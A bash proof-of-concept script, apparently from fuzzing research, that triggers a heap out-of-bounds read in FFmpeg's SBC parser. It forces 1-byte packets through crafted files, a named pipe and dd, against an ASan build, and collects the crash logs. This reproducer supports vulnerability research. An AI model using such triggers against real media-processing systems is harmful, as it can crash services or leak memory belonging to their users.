#!/bin/bash
# PoC run script for SBC parser heap OOB read
# Vulnerability: sbc_parse() in libavcodec/sbc_parser.c lines 89-94
# CWE-125: Out-of-bounds Read
#
# Trigger: -raw_packet_size 1 forces the SBC raw demuxer (ff_raw_read_partial_packet)
# to issue 1-byte read_packet calls, so the SBC parser receives exactly 1 byte per
# call. This walks the parser into:
#   Call 1 (1 byte = 0x9C): header_size <- 1
#   Call 2 (1 byte = 0x00): memcpy(pc->header+1, buf, 2) with buf_size=1 => OOB read
#
# Note: probesize minimum is 32; we omit it and rely on raw_packet_size alone.
# Format is forced with -f sbc so probing is minimal anyway.

set -euo pipefail
cd "$(dirname "$0")"

BIN=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg

echo "=== SBC parser OOB read PoC ==="
echo "Binary: $BIN"
echo "Date:   $(date)"
echo ""

# Generate input files
echo "[*] Generating crafted SBC input files..."
python3 vuln_001_gen.py

echo ""
echo "=== Approach 1: primary input (8 bytes), raw_packet_size=1 ==="
# The raw SBC demuxer reads raw_packet_size bytes per call.
# With raw_packet_size=1, each av_parser_parse2() call gets exactly 1 byte.
# Call 1: buf=[0x9C], buf_size=1 => header_size=1 (state stored)
# Call 2: buf=[0x00], buf_size=1 => memcpy(header+1, buf, 2) reads past buf => OOB
ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a1.log:detect_leaks=0" \
  "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i vuln_001_input.sbc \
    -f null - 2>&1 || true
echo "---"
cat asan_a1.log.* 2>/dev/null || true

echo ""
echo "=== Approach 2: variant2 (2-byte file), raw_packet_size=1 ==="
ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a2.log:detect_leaks=0" \
  "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i vuln_001_input2.sbc \
    -f null - 2>&1 || true
echo "---"
cat asan_a2.log.* 2>/dev/null || true

echo ""
echo "=== Approach 3: MSBC variant, raw_packet_size=1 ==="
ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a3.log:detect_leaks=0" \
  "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i vuln_001_input3.sbc \
    -f null - 2>&1 || true
echo "---"
cat asan_a3.log.* 2>/dev/null || true

echo ""
echo "=== Approach 4: named pipe, 1 byte at a time ==="
# Use a named pipe to deliver exactly 1 byte per write with timing control.
# Writer sends 0x9C first (to set header_size=1), waits, then sends 0x00 (triggers OOB).
PIPE_PATH=/tmp/sbc_poc_pipe_$$
mkfifo "$PIPE_PATH" 2>/dev/null || true

# Writer: send 0x9C, pause briefly, send 0x00
(
  printf '\x9c'
  sleep 2
  printf '\x00'
  sleep 2
) > "$PIPE_PATH" &
WRITER_PID=$!

ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a4.log:detect_leaks=0" \
  timeout 10 "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i "$PIPE_PATH" \
    -f null - 2>&1 || true

kill "$WRITER_PID" 2>/dev/null || true
wait "$WRITER_PID" 2>/dev/null || true
rm -f "$PIPE_PATH"
echo "---"
cat asan_a4.log.* 2>/dev/null || true

echo ""
echo "=== Approach 5: larger file (longer stream), raw_packet_size=1 ==="
# Try with larger input to ensure multiple parser cycles
ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a5.log:detect_leaks=0" \
  "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i vuln_001_input4.sbc \
    -f null - 2>&1 || true
echo "---"
cat asan_a5.log.* 2>/dev/null || true

echo ""
echo "=== Approach 6: pipe via dd (1 byte at a time through stdin) ==="
# Feed bytes through a pipe using dd to force 1-byte blocks at the OS level.
# ffmpeg reads from stdin when given '-i -' or '-i pipe:'.
ASAN_OPTIONS="abort_on_error=0:halt_on_error=0:log_path=./asan_a6.log:detect_leaks=0" \
  dd if=vuln_001_input.sbc bs=1 2>/dev/null | \
  "$BIN" \
    -loglevel verbose \
    -f sbc \
    -raw_packet_size 1 \
    -analyzeduration 0 \
    -i pipe: \
    -f null - 2>&1 || true
echo "---"
cat asan_a6.log.* 2>/dev/null || true

echo ""
echo "=== Checking all ASAN logs ==="
for LOG in asan_a*.log.*; do
    if [ -f "$LOG" ] && [ -s "$LOG" ]; then
        echo "=== ASAN OUTPUT in $LOG ==="
        cat "$LOG"
    fi
done 2>/dev/null || true

echo ""
echo "=== PoC run complete ==="
